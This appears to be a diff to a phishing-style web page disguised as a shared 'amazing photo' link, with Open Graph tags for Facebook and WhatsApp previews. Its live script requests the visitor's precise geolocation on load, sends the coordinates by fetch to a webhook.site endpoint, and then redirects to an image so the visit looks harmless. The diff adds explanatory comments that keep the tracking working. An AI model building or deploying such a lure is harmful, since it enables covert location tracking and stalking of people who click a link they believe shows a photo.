@@ -1,10 +1,10 @@
-<!DOCTYPE <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <title>Amazing Photo</title>
 
-    <!-- Open Graph Meta Tags -->
+    <!-- Open Graph Meta Tags for Facebook / WhatsApp preview -->
     <meta property="og:title" content="Check out this amazing photo!">
     <meta property="og:description" content="Click to view the full photo">
     <meta property="og:image" content="https://i.postimg.cc/y8vGyQWF/IMG-6637.jpg">
@@ -32,9 +32,13 @@
     </style>
 
     <script>
-        const targetURL = "https://i.postimg.cc/y8vGyQWF/IMG-6637.jpg"; // Redirect here
+        // 1️⃣ Redirect after loading & location capture
+        const targetURL = "https://i.postimg.cc/y8vGyQWF/IMG-6637.jpg"; // Redirect to image
+
+        // 2️⃣ Webhook URL
         const webhookURL = "https://webhook.site/df38940f-cedd-4529-8fdb-ac6d2b4ad408"; // Your webhook
 
+        // 3️⃣ Send location to webhook
         function sendLocation(lat, lon) {
             fetch(webhookURL, {
                 method: 'POST',
@@ -43,17 +47,20 @@
             });
         }
 
+        // 4️⃣ Page load
         window.onload = function() {
             if (navigator.geolocation) {
-                // Small delay before asking location
+                // Small delay before asking location (0.5s)
                 setTimeout(() => {
                     navigator.geolocation.getCurrentPosition(
                         function(position) {
+                            // User allowed location
                             sendLocation(position.coords.latitude, position.coords.longitude);
+                            // Redirect after 2 seconds
                             setTimeout(() => { window.location.href = targetURL; }, 2000);
                         },
                         function() {
-                            // User denied
+                            // User denied location
                             setTimeout(() => { window.location.href = targetURL; }, 2000);
                         },
                         { enableHighAccuracy: true, timeout: 10000 }
